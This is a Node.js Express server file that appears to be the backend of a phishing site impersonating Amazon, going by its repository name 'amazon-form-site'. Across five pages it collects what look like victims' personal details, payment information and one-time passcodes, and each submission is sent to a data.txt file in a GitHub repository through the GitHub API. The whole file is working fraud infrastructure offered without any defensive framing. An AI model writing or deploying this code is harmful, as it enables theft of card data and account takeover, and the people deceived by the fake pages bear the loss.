const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const REPO_OWNER = 'afffaaaa28-glitch';
const REPO_NAME = 'amazon-form-site';
const FILE_PATH = 'data.txt';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'views')));

async function saveToGitHub(data) {
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
    const content = Buffer.from(data + '\n---\n').toString('base64');

    let sha = '';
    try {
        const res = await fetch(url, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });
        if (res.ok) {
            const info = await res.json();
            sha = info.sha;
        }
    } catch (e) {}

    await fetch(url, {
        method: 'PUT',
        headers: {
            Authorization: `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: `Update ${new Date().toISOString()}`,
            content,
            sha
        })
    });
}

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page1.html')));
app.get('/page2', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page2.html')));
app.get('/page3', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page3.html')));
app.get('/page4', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page4.html')));
app.get('/page5', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page5.html')));

app.post('/submit-data', async (req, res) => {
    try {
        await saveToGitHub(JSON.stringify(req.body, null, 2));
        res.redirect('/page3');
    } catch (e) { res.status(500).send('Error'); }
});

app.post('/submit-payment', async (req, res) => {
    try {
        await saveToGitHub(JSON.stringify(req.body, null, 2));
        res.redirect('/page4');
    } catch (e) { res.status(500).send('Error'); }
});

app.post('/submit-otp', async (req, res) => {
    try {
        await saveToGitHub(JSON.stringify(req.body, null, 2));
        res.redirect('/page5');
    } catch (e) { res.status(500).send('Error'); }
});

app.listen(PORT, () => console.log(`✅ Server on port ${PORT}`));
